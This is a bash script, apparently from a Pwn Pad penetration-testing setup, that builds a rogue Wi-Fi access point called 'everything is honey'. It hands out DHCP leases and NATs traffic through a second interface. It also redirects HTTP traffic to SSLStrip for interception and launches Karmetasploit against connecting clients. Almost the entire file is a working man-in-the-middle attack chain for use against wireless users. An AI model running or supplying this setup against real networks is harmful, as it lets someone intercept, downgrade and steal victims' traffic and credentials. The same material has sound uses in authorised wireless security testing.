# Clean up previous
pkill airbase-ng 
pkill dhcpd
ifconfig at0 down
airmon-ng stop mon0
sleep 3;
echo "Flushing iptables"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
sleep 3

# Start monitor
echo "Staring monitor on wlan1"
airmon-ng start wlan1
sleep 3;

# Start AP
echo "Starting fake AP"
airbase-ng -e "everything is honey" -c 9 mon0 & 
sleep 5;

# Tap interface up
echo "at0 going up..."
ifconfig at0 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0

# Route traffic
echo "Routing traffic"
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
sleep 2;
cd ~
echo "clearing lease table"
echo > '/var/lib/dhcp/dhcpd.leases'

# Forward traffic from wlan1 out wlan0

echo "configuring iptables"
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE

# SSL strip forwarding

sleep 2;
echo "setting up SSLStrip interception"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 2;

# Start dhcp server on at0
dhcpd -cf /etc/dhcp/dhcpd.conf at0
sleep 3;

#ip forwarding

echo 1 > /proc/sys/net/ipv4/ip_forward

#start karmetasploit

msfconsole -r /opt/pwnpad/karmetasploit/karma.rc